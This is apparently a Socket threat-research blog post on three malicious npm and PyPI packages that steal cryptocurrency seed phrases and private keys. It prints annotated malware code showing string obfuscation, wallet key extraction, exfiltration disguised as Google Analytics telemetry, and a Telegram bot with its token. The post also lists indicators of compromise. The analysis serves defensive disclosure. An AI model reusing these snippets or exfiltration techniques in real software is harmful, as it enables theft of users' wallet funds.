---
title: "The Bad Seeds: Malicious npm and PyPI Packages Pose as Developer Tools to Steal Wallet Credentials"
short_title: "Malicious npm and PyPI Packages Steal Wallet Credentials"
date: 2025-04-22 12:00:00 +0000
categories: [Malware, PyPI]
tags: [npm, JavaScript, Python, PyPI, Infostealer, T1195.002, T1059.006, T1059.007, T1566.003, T1608.001, T1204.002, T1552.004, T1071.001, T1041]
canonical_url: https://socket.dev/blog/malicious-npm-and-pypi-packages-steal-wallet-credentials
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/48797cb10213996c8083abc98dbe3dc1b0c4bb5c-1024x1024.webp
  alt: "The Bad Seeds: Malicious npm and PyPI Packages Pose as Developer Tools to Steal Wallet Credentials"
description: "Socket researchers uncovered malicious npm and PyPI packages that steal crypto wallet credentials using Google Analytics and Telegram for exfiltration."
---

The Socket Threat Research Team has uncovered three malicious packages – one on the npm registry and two on the Python Package Index (PyPI) – all designed to exfiltrate cryptocurrency secrets, including mnemonic seed phrases and private keys.

1. [`react-native-scrollpageviewtest`](https://socket.dev/npm/package/react-native-scrollpageviewtest/overview/1.5.5) (npm), released in 2021 and downloaded 1,215 times, poses as a page-scrolling helper but secretly extracts mnemonic seed phrases and private cryptocurrency keys, using Google Analytics as its exfiltration channel.
1. [`web3x`](https://socket.dev/pypi/package/web3x/overview/0.3/py3-none-any-whl) (PyPI), released in 2024 and downloaded 3,405 times, poses as an Ethereum balance checker but silently exfiltrates the victim's mnemonic seed phrase to a Telegram bot.
1. [`herewalletbot`](https://socket.dev/pypi/package/herewalletbot) (PyPI), released in 2024 and downloaded 3,425 times, presents itself as a wallet tool but actually operates as credential-harvesting malware that steals mnemonic seed phrases.

As of this publication, the packages remain live on npm and PyPI, but we have requested their removal from the respective repositories.

The key take-away advice for developers is simple but critical: your mnemonic seed phrase and private key are the keys to your crypto assets. Never share them with anyone, any code, or any bot, no matter how convincing the social engineering prompts may be. Any package that collects or transmits these secrets without your explicit, informed consent is malicious. If a script or individual asks for your seed phrase; it's not a feature, it's a scam.

## From UI Helper to Wallet Hijacker: `react‑native‑scrollpageviewtest`

The `react-native-scrollpageviewtest` package poses as a simple "scroll-page-view" helper, but behind the minimal UI code, it dynamically loads the host React Native wallet engine, extracts every available private key and mnemonic seed phrase, encodes the data in Base64, and exfiltrates it to the threat actor. The threat actor, operating under the npm alias `twoplus` (registration email address `twoplusten@163[.]com`), uses multiple techniques to evade detection and ensure reliable exfiltration of sensitive wallet data.

![Socket AI Scanner analysis of react-native-scrollpageviewtest](https://cdn.sanity.io/images/cgdhsj6q/production/0e71338c92b977b16ffb88a7bb38befd42534d53-567x579.png)
_Socket AI Scanner's analysis, including contextual details about the malicious `react‑native‑scrollpageviewtest` package._

Rather than referencing sensitive libraries directly, the code splits letters in strings to defeat basic string-matching detection. For instance, it constructs the word `buffer` dynamically like [this](https://socket.dev/npm/package/react-native-scrollpageviewtest/files/1.5.5/GestureCommon/CommonLottieScroller.js#L71):

```javascript
const bu = require('b' + 'u' + 'f' + 'f' + 'e' + 'r').Buffer;
```

Also, the threat actor encodes internal wallet APIs in Base64. The name `KeyringController`, which provides access to sensitive cryptographic material, appears in [this](https://socket.dev/npm/package/react-native-scrollpageviewtest/files/1.5.5/GestureCommon/CommonLottieScroller.js) obfuscated form:

```javascript
const controllerName = Buffer.from("S2V5cmluZ0NvbnRyb2xsZXI=", "base64").toString("ascii");

// Result: "KeyringController"
const kkk = engine.default.context[controllerName];
```

Once the threat actor establishes access to the wallet engine, they [retrieve](https://socket.dev/npm/package/react-native-scrollpageviewtest/files/1.5.5/GestureCommon/CommonLottieScroller.js#L290) the master password:

```javascript
const darw = kkk["getPassword"]();  // Steals wallet password
```

Then the code extracts secrets using built-in functions:

```javascript
const priv = await kkk.exportAccount(pwd, accounts[0]);  // steals private key
const seed = await kkk.exportSeedPhrase(pwd, i);         // steals seed phrase
```

To prepare the stolen data for exfiltration, the threat actor adds a layer of randomness to the payload. Each secret gets a four-character random prefix before being Base64-encoded. The script then batches these encoded payloads and sends them to a Google Analytics endpoint disguised as standard Measurement Protocol `pageview` or `event` telemetry:

```javascript
// Encode and push to Google Analytics
const line = "v=1&tid=UA-215070146-1&cid=" + stg +
             "&t=pageview&dt=" + ec + "&dl=" + ecy(priv) + "\n";
fetch('https://www.google-analytics.com/collect', {      // exfiltration channel
  method:'POST', body: line, headers:{'Content-Type':'text/plain'}
});
```

By exfiltrating the payload to `google-analytics.com/collect`, the threat actor takes advantage of common whitelisting of analytics domains. Most corporate proxies and endpoint protection systems allow traffic to Google Analytics, making this channel both stealthy and reliable.

A Tracking ID (in this case, `UA-215070146-1`) uniquely identifies a Google Analytics property. When the threat actor sends data to the `collect` endpoint, the `tid` parameter specifies which Google Analytics account should receive it. The threat actor repurposes this legitimate analytics channel to exfiltrate sensitive wallet data to infrastructure they control. This is a [known](https://thehackernews.com/2020/06/google-analytics-hacking.html) exfiltration method observed in both malware campaigns and offensive tooling.

In the payload:

- `tid=UA-215070146-1` — designates the threat actor's Google Analytics property
- `cid=` — identifies the victim (e.g., wallet ID or session hash)
- `dl=` — carries the stolen secret (e.g., a Base64-encoded seed phrase)
- `t=pageview` — disguises the transmission as a benign page visit.

The malware sends this data using an `HTTPS POST` request to `google-analytics.com/collect`, mimicking standard telemetry. This allows the threat actor to view stolen credentials inside their Google Analytics dashboard, formatted as incoming `pageview` data.

To avoid repeated exfiltration and reduce the chance of detection, the threat actor [stores](https://socket.dev/npm/package/react-native-scrollpageviewtest/files/1.5.5/GestureCommon/CommonLottieScroller.js#L31) a hash of the leaked payload in local storage:

```javascript
AsyncStorage.setItem("meta-store-ens-data", getSaf(rtn));
```

They also wrap the entire [operation](https://socket.dev/npm/package/react-native-scrollpageviewtest/files/1.5.5/GestureCommon/CommonLottieScroller.js#L137) in conditional checks that prevent execution in development builds or when test data is detected:

```javascript
if (!__DEV__ || eqx(darw) || darw.startsWith('1234')) {
  return;  // Avoid dev/test environments
}
```

These dev-gating conditions help the malware avoid detection during testing and reduce the chance of crashing or being noticed before it reaches real users.

Taken together, the techniques used in `react-native-scrollpageviewtest` illustrate a highly targeted and evasive credential-stealing operation. From obfuscated strings and Base64 API references to randomized payloads and stealthy exfiltration via Google Analytics, the package demonstrates how little code it takes to drain a victim's wallet.

## Mnemonic Exfiltration via Telegram Bot: `web3x`

The `web3x` package presents itself as a simple Ethereum wallet utility, but it operates as credential-harvesting malware designed to drain cryptocurrency wallets. The script tricks users into supplying their mnemonic seed phrase, then silently sends it — along with wallet balances — to a hardcoded Telegram bot. With that information, the threat actor behind the PyPI account `tonymevbots` (registration email address `xeallmail@mitico[.]org`) can import the wallet and take full control of its assets. Written in Python and dependent only on common libraries, the malware runs on any platform where Python is installed, making it broadly effective and easy to deploy.

![Socket AI Scanner analysis of web3x](https://cdn.sanity.io/images/cgdhsj6q/production/d7b64ae7f4dc3119408d6b693e0f53d24cf8f9ba-564x531.png)
_Socket AI Scanner's analysis, including contextual details about the malicious `web3x` package._

Below are the annotated [code](https://socket.dev/pypi/package/web3x/files/0.3/py3-none-any-whl/web3x/web3x.py) snippets for the malicious `web3x` package.

```python
# --- Imports legitimate libraries ---
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet
from hdwallet.derivations import BIP44Derivation
import requests
from web3 import Web3

# --- Connects to Infura (public Ethereum node) ---
web3 = Web3(Web3.HTTPProvider(
    'https://mainnet.infura.io/v3/b2ab312572f842aeb5efe66a439c4229'))

# --- Helper sends arbitrary text to threat actor‑controlled Telegram bot ---
def ver(msg):
    requests.get(
        url=("https://api.telegram.org/"
             "bot5847347125:AAG-WskaS485OUlGLfa5AKEMW1aKYymplPQ/"
             "sendMessage?chat_id=1409893198&text={msg}".format(msg=msg))

# --- Derives addresses, leaks seed phrase and balance to the threat actor ---
def gen(seed, ranges):
    ver(seed)
    ...
    for address_index in range(int(ranges)):
        ...
        bal = check_eth_balance(bip44_hdwallet.address())
        ver(bal)
```

Immediately upon execution, the script calls a function `ver(seed)` that sends the provided seed phrase to a hardcoded Telegram chat ID via the Telegram Bot API. This happens before any balance-checking logic is executed. The script operates silently, giving no indication that it's leaking sensitive credentials.

Once the script has the seed, it proceeds to derive BIP-44 addresses `m/44'/60'/0'/0/i` using the supplied mnemonic and iterates through the specified number of address indexes. For each derived address, it connects to Ethereum's mainnet via Infura, a legitimate blockchain infrastructure service, to retrieve the wallet balance. The script then sends each balance it finds to the same Telegram bot, ensuring the threat actor receives both the seed and a full picture of the wallet's contents.

The threat actor can immediately import the wallet and transfer out all ETH and ERC-20 tokens tied to the leaked seed. If the victim reused the same mnemonic across other wallets or chains, those are at risk too.

## Automated Phishing: `herewalletbot`

The `herewalletbot` package functions as a headless (i.e. without graphical user interface) Telegram automation tool that guides victims through a login flow and tricks them into submitting their wallet seed phrase to a Telegram bot `@herewalletbot`. While the package poses as a wallet automation utility, the only real functionality it provides is automating browser clicks the user could perform themselves in Telegram Web.

![Socket AI Scanner analysis of herewalletbot](https://cdn.sanity.io/images/cgdhsj6q/production/12d909ab945d471e0650c87a1e26f1ab7703481b-566x479.png)
_Socket AI Scanner's analysis, including contextual details about the malicious `herewalletbot` package._

The threat actor operating under the PyPI alias `vannszs` (registration email address `bevansatria@gmail[.]com`) designed the script to prompt the user for the secret that controls all their crypto assets, exfiltrating it to threat actor-controlled infrastructure (Telegram bot), and suppressing logs and audio to avoid detection. This is a fully scripted social engineering credential-harvesting package disguised as convenience.

Below are the annotated [code](https://socket.dev/pypi/package/herewalletbot/files/1.0/py3-none-any-whl/herewalletbot/herewalletbot.py) snippets for the malicious `herewalletbot` package.

```python
# --- Launch silent Chrome session, reuse stored cookies ---
chrome_options.add_argument("--headless")                     # stealth execution
chrome_options.add_argument(f"user-data-dir={session_path}")

# --- Force‑loop until victim logs in with phone and OTP ---
login = wait.until(EC.element_to_be_clickable(
    (By.XPATH, '//*[@id="auth-pages"]/div/div[2]/div[3]/div/div[2]/button'))).click()
...
nomeruser = input("enter your phone number without country code") # captures phone
otpmu = input("input your otp : ")                                # captures OTP

# --- Open threat actor‑controlled bot chat ---
url = 'hxxps://web[.]telegram[.]org/k/#@herewalletbot'
driver.get(url)
...
element_input_text.send_keys("/start")              # initiates bot flow

# --- Seed‑phrase harvest inside embedded iframe ---
seed = input("Enter Your Seed/Phrase here: ")       # victim supplies seed
input_field.send_keys(seed)                         # seed enters bot chat

# --- Infinite loop keeps session alive / re‑claims ---
while True:
    main()                                          # credential capture
```

There is no legitimate reason for any automating browser clicks tool to request a user's mnemonic — a wallet already has access to its own keys. The moment the tool asks for a seed phrase, it crosses the line from automation to credential theft.

![Threat actor's README with crossed out seed handling](https://cdn.sanity.io/images/cgdhsj6q/production/78e7b59dbc825b44de19c2c21cd01f6eca3cb1af-884x876.png)
_The threat actor crossed out the seed-handling feature in the README of the now-suspended GitHub repository `https://github.com/vannszs/HotWalletBot/` to downplay its presence while retaining the functionality in code. This deception tactic was likely intended to reduce scrutiny from users and GitHub moderators while continuing to exfiltrate mnemonic seed phrases via the `herewalletbot` Telegram bot._

The script automates navigation and clicks through a sequence of dialog elements, guiding the victim through the Telegram interface. It eventually reaches an embedded iframe (i.e. an inline frame used to load another webpage inside the current page) where it prompts the user to manually enter their mnemonic seed phrase. Once entered, the script captures the phrase and pastes it into the bot chat, handing full control of the wallet to the threat actor.

![Reddit user reports fund loss after using herewalletbot](https://cdn.sanity.io/images/cgdhsj6q/production/cac8dc07dca797eff6777bc5aaf6611ab9b5b3cd-1366x320.png)
_A Reddit user [reports](https://www.reddit.com/r/nearprotocol/comments/1b1d3ho/comment/kykhwcb/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button) that after using `herewalletbot`, all wallet funds disappeared despite re-entering their seed phrase, indicating a likely credential theft and irreversible asset loss._

The malware does not stop after a single interaction. It loops indefinitely, monitoring on-screen elements such as countdown timers `waktu_text` to determine when another claim cycle — a recurring opportunity for users to receive free tokens or rewards from the bot — might begin. This persistence ensures the script stays active.

In practice, the `herewalletbot` package functions as credential-harvesting malware targeted at Telegram users who are hunting for HOT or Here Wallet promotional crypto reward campaigns. By impersonating a reward claim assistant, it gains access to the most sensitive piece of wallet information — the mnemonic — and uses it to take full control of the user's crypto assets.

## Outlook and Recommendations

The discovery of `react-native-scrollpageviewtest`, `web3x`, and `herewalletbot` underscores a persistent threat in open source ecosystems: malicious packages that disguise themselves as developer-friendly utilities while stealing credentials. These packages exploit developers' trust in seemingly harmless modules, in package registries, and in the workflows they rely on daily. By embedding themselves into wallet environments and development pipelines, they position themselves to extract some of crypto's most sensitive secrets — mnemonic seed phrases and private keys. Despite their malicious behavior, these packages remained publicly available on npm and PyPI for months amassing thousands of downloads.

Mainstream wallets like [MetaMask](https://support.metamask.io/start/user-guide-secret-recovery-phrase-password-and-private-keys/) and [Ledger](https://www.ledger.com/academy/hardwarewallet/best-ways-to-protect-your-recovery-phrase) consistently emphasize a critical rule: ***never share your seed phrase with anyone and never transmit it off-device***. This rule forms the foundation of secure self-custody. When a script collects and sends a mnemonic to infrastructure controlled by a threat actor — such as a Telegram bot — without encryption, user control, or informed consent, it isn't managing a wallet; it's committing credential theft.

Developers and organizations must respond with proactive defenses. Source-code review, automated scanning, and runtime behavior monitoring must become part of the standard development lifecycle, especially for packages that touch browser environments, Web3 libraries, or authentication flows.

Security tooling must evolve to meet the current threat landscape. Socket's free tools — the [GitHub app](https://socket.dev/features/github), [CLI tool](https://socket.dev/features/cli), and [browser extension](https://socket.dev/features/web-extension) — deliver real-time dependency analysis and malware detection for open source projects. When integrated early in the development process, these tools can block malicious packages before they ever reach production.

## Indicators of Compromise (IOCs)

### Malicious npm package

- [`react-native-scrollpageviewtest`](https://socket.dev/npm/package/react-native-scrollpageviewtest/overview/1.5.5)

### Malicious PyPI packages

- [`web3x`](https://socket.dev/pypi/package/web3x/overview/0.3/py3-none-any-whl)
- [`herewalletbot`](https://socket.dev/pypi/package/herewalletbot)

### Malicious Endpoints

- `@herewalletbot` — Telegram bot
- `hxxps://web[.]telegram[.]org/k/#@herewalletbot` — Telegram bot URL
- `5847347125:AAG-WskaS485OUlGLfa5AKEMW1aKYymplPQ` — Telegram bot token

### Threat Actor Identifiers

- `twoplus` — npm alias
- `twoplusten@163[.]com` — email address
- `tonymevbots` — PyPI alias
- `xeallmail@mitico[.]org` — email address
- `vannszs` — PyPI alias
- `bevansatria@gmail[.]com` — email address
- `https://github.com/vannszs/HotWalletBot/` — GitHub repository (defunct)
- `vannszs` — GitHub alias

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1059.006 — Command and Scripting Interpreter: Python
- T1059.007 — Command & Scripting Interpreter: JavaScript
- T1566.003 — Phishing: Spearphishing via Service
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1552.004 — Unsecured Credentials: Private Keys
- T1071.001 — Application Layer Protocol: Web Protocols
- T1041 — Exfiltration Over C2 Channel
